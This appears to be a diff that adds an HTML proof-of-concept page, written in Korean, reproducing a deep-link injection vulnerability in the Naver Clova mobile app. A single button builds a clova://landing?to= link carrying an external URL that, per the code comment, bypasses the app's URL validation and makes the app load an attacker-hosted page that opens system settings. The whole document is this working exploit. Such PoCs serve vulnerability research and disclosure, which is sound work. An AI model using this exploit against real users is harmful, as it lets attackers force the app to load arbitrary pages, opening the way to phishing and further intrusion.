@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Clova Intent Injection PoC</title>
+    <style>
+        button { padding: 20px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>네이버 클로바 취약점 재현 테스트</h2>
+    <p>아래 버튼을 누르면 클로바 앱이 실행되며, 주입된 URL에 의해 시스템 설정창이 팝업됩니다.</p>
+    
+    <button onclick="launchClova()">취약점 실행 (clova://landing)</button>
+
+    <script>
+        function launchClova() {
+            // 공격자가 주입한 URL (클로바 앱의 검증을 우회하여 로드될 대상)
+            var targetUrl = "https://junylee.github.io/test/go_settings.html";
+            
+            // 최종 딥링크 구조
+            var deepLink = "clova://landing?to=" + encodeURIComponent(targetUrl);
+            
+            console.log("실행 딥링크: " + deepLink);
+            
+            // 딥링크 실행
+            location.href = deepLink;
+        }
+    </script>
+</body>
+</html>
